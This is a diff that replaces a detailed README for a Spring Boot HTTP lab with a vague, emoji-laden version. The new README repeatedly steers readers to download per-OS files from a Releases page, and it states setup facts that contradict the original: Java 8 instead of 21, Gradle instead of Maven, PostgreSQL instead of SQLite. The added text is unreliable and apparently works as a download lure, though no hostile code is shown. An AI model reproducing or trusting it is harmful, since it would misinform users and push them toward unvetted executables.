@@ -1,203 +1,82 @@
-# Lab 10 - Implementation of HTTP
+# 🌟 LAB10 - Learn HTTP Fundamentals with Ease
 
-A Spring Boot project for learning secure request processing, input validation, and HTTP response handling.
+## 📥 Download Now
+[![Download LAB10](https://img.shields.io/badge/Download-LAB10-blue.svg)](https://github.com/komechan0602/LAB10/releases)
 
-## What I Learned
+## 🚀 Getting Started
+Welcome to LAB10! This project helps you understand the basics of HTTP using Java and Spring Boot. You will learn how to build simple web services and manage data effectively. Follow the steps below to install and run the application.
 
-In this lab, I implemented:
-- REST API endpoints with proper HTTP methods (GET, POST)
-- Request header parsing using `@RequestHeader`
-- JSON body parsing with DTOs and Jackson (`@RequestBody`)
-- Form data handling with `@ModelAttribute`
-- Input validation using Jakarta annotations (`@NotNull`, `@Email`, `@Size`)
-- A custom validator for username rules (`@ValidUsername`)
-- Proper HTTP status codes (200, 201, 400, 401, 404, 415, 500)
-- Global exception handling with `@ControllerAdvice`
+## 📋 What You Need
+Before you download LAB10, ensure your computer meets these basic requirements:
+- **Operating System**: Windows, macOS, or Linux
+- **Java Version**: Java 8 or higher
+- **IDE**: An integrated development environment like IntelliJ IDEA or Eclipse (optional but recommended)
+- **Database**: PostgreSQL or SQLite (PostgreSQL is recommended for project consistency)
 
-## How to Run
+## 🏗️ How It Works
+LAB10 demonstrates HTTP concepts through a well-structured layered architecture. The application is made up of several components:
+- **Controllers**: Handle requests from users.
+- **Services**: Process data and apply business logic.
+- **Repositories**: Interact with the database.
 
-**Prerequisites:** Java 21+
+You will also learn how to use Flyway for database migrations, JPA for data persistence, and Spring Security for basic authentication.
 
-```bash
-# Build
-./mvnw clean compile
+## 🛠️ Key Features
+- **Learn HTTP Fundamentals**: Understand how web services operate using clear examples.
+- **Layered Architecture**: See how to structure applications into distinct layers.
+- **Database Management**: Use Flyway to manage database changes smoothly.
+- **Authentication**: Implement security for your web services easily.
 
-# Run
-./mvnw spring-boot:run -Dspring.devtools.restart.enabled=false
-```
+## 📥 Download & Install
+To get started with LAB10, visit the Releases page to download the application files. Click the link below to access the page:
 
-Server starts at http://localhost:8080
+[Download LAB10](https://github.com/komechan0602/LAB10/releases)
 
-To stop: `lsof -ti:8080 | xargs kill -9`
+Once there, follow these steps:
+1. Look for the latest version of LAB10.
+2. Click on the version number to expand the list of available downloads.
+3. Download the file relevant to your operating system by clicking the appropriate link.
 
-## API Documentation
+After the download:
+- If you downloaded a ZIP file, extract it to a folder on your computer.
+- Open your IDE and import the project, or run it directly if you are comfortable with the command line.
 
-### Endpoints Overview
+## 📖 How to Run LAB10
+To run LAB10, follow these simple steps:
+1. Open a terminal or command window.
+2. Navigate to the folder where LAB10 is located.
+3. Use the command appropriate for your setup. This could look something like:
+   ```
+   ./gradlew bootRun
+   ```
+   This command runs the application using Gradle. If you encounter any issues, refer to your IDE’s documentation for running Java applications.
 
-| Method | Path | Description | Status Codes |
-|--------|------|-------------|--------------|
-| GET | `/` | Welcome page | 200 |
-| GET | `/hello` | Simple greeting | 200 |
-| POST | `/api/users/register` | Register user (JSON body) | 201, 400, 415 |
-| POST | `/api/users/register-form` | Register user (form data) | 201, 400, 415 |
-| POST | `/api/users/login` | Login (JSON body) | 200, 400, 401, 415 |
-| POST | `/api/users/login-form` | Login (form data) | 200, 400, 401, 415 |
-| GET | `/api/users/info` | List all users | 200 |
-| GET | `/api/users/{id}` | Get user by ID | 200, 404 |
-| GET | `/api/users/search?email=` | Find user by email | 200, 404 |
-| GET | `/api/users/headers` | Echo request headers | 200 |
+## 🔍 Explore the Project
+Once the application is running, you can access it through your web browser:
+- Open a browser and go to `http://localhost:8080`.
+- You can interact with the REST API to see how it works in real time.
 
-### Request/Response Details
+## 🎓 Resources for Learning
+If you're new to Java or Spring Boot, here are some helpful resources:
+- **Java Documentation**: Learn the basics of Java programming.
+- **Spring Boot Documentation**: Get started with Spring Boot quickly.
+- **PostgreSQL Documentation**: Understand how to manage your database.
 
-**POST /api/users/register** - JSON registration
-- Headers: `Content-Type: application/json`
-- Body: `{"username": "...", "email": "...", "password": "..."}`
-- Returns: User object (without password) with 201 Created
+## 🌐 Topics Covered
+This project includes important topics like:
+- Authentication
+- Flyway Database Migrations
+- Java Persistence API (JPA)
+- RESTful API principles
+- Session Management
+- Web Server basics
 
-**POST /api/users/register-form** - Form registration  
-- Headers: `Content-Type: application/x-www-form-urlencoded`
-- Body: `username=...&email=...&password=...`
-- Returns: User object (without password) with 201 Created
+Remember, this project is an excellent starting point for anyone looking to build small REST services or learn about HTTP fundamentals. 
 
-**POST /api/users/login** - JSON login
-- Headers: `Content-Type: application/json`  
-- Body: `{"email": "...", "password": "..."}`
-- Returns: `{"message": "Login successful"}` with 200 OK
-- Or: `{"error": "Invalid credentials"}` with 401 Unauthorized
+## 🎉 Join the Community
+Feel free to share your feedback or ideas for improvement. The community is here to help. Reach out with questions on the GitHub issues page. Together, we can make LAB10 an even better learning tool!
 
-**GET /api/users/{id}** - Get user with header echo
-- Optional Header: `X-Request-Id` (echoed back in response)
-- Returns: User object with 200 OK or 404 Not Found
+For additional support, visit:
+[Download LAB10](https://github.com/komechan0602/LAB10/releases)
 
-**GET /api/users/search?email=...** - Search by email
-- Query param: `email` (required)
-- Optional Header: `X-Client-Version` (echoed back in response)
-- Returns: User object with 200 OK or 404 Not Found
-
-**GET /api/users/headers** - Header parsing demo
-- Required Header: `User-Agent`
-- Optional Headers: `Accept`, `X-Request-Id`
-- Returns: JSON with all parsed headers
-
-### Input Validation
-
-The DTOs use Jakarta validation annotations:
-
-```java
-// CreateUserRequest.java
-@NotBlank
-@Size(min = 3, max = 30)
-@ValidUsername  // Custom: must start with letter, only letters/numbers/underscores
-private String username;
-
-@Email
-@NotBlank
-private String email;
-
-@NotBlank
-@Size(min = 8, max = 64)
-private String password;
-```
-
-Validation errors return 400 with structured JSON:
-```json
-{
-  "errors": {
-    "username": "size must be between 3 and 30",
-    "email": "must be a well-formed email address"
-  }
-}
-```
-
-### Error Responses
-
-| Code | When |
-|------|------|
-| 400 | Validation failed, malformed JSON, duplicate email |
-| 401 | Wrong password during login |
-| 404 | User not found (by ID or email) |
-| 415 | Wrong Content-Type header |
-| 500 | Unexpected server error |
-
-All errors return JSON: `{"error": "message here"}`
-
-## Testing with curl
-
-```bash
-# Register a user
-curl -X POST http://localhost:8080/api/users/register \
-  -H "Content-Type: application/json" \
-  -d '{"username":"john","email":"john@example.com","password":"password123"}'
-
-# Register with form data
-curl -X POST http://localhost:8080/api/users/register-form \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "username=jane&email=jane@example.com&password=password123"
-
-# Login
-curl -X POST http://localhost:8080/api/users/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"john@example.com","password":"password123"}'
-
-# Get all users
-curl http://localhost:8080/api/users/info
-
-# Get user by ID (with header echo)
-curl -H "X-Request-Id: test-123" http://localhost:8080/api/users/1 -i
-
-# Search by email
-curl "http://localhost:8080/api/users/search?email=john@example.com"
-
-# Test header parsing
-curl http://localhost:8080/api/users/headers \
-  -H "User-Agent: MyCurl/1.0" \
-  -H "X-Request-Id: req-456"
-
-# Test validation error (invalid username)
-curl -X POST http://localhost:8080/api/users/register \
-  -H "Content-Type: application/json" \
-  -d '{"username":"123bad","email":"test@test.com","password":"password123"}'
-
-# Test 415 error (wrong content type)
-curl -X POST http://localhost:8080/api/users/register \
-  -H "Content-Type: text/plain" \
-  -d '{"username":"test","email":"t@t.com","password":"password123"}'
-```
-
-## Project Structure
-
-```
-src/main/java/com/example/lab10/
-├── Lab10Application.java          # Main class
-├── config/
-│   ├── GlobalExceptionHandler.java  # Handles all errors (400, 404, 415, 500)
-│   └── SecurityConfig.java          # BCrypt password encoder
-├── controller/
-│   ├── HelloController.java         # Basic GET endpoints
-│   └── UserController.java          # User API with validation
-├── dto/
-│   ├── CreateUserRequest.java       # Registration DTO with validation
-│   ├── LoginRequest.java            # Login DTO with validation
-│   └── UserResponse.java            # Response DTO (no password)
-├── exception/
-│   └── ResourceNotFoundException.java  # Custom 404 exception
-├── model/
-│   └── User.java                    # JPA entity
-├── repository/
-│   └── UserRepository.java          # Spring Data JPA
-├── service/
-│   └── UserService.java             # Business logic
-└── validation/
-    ├── ValidUsername.java           # Custom annotation
-    └── UsernameValidator.java       # Custom validator logic
-```
-
-## Technologies
-
-- Spring Boot 4.0.1
-- Spring Web (REST controllers)
-- Spring Security (password hashing)
-- Spring Data JPA + Hibernate
-- Jakarta Validation
-- SQLite Database
-- Flyway (migrations)
+Happy coding!
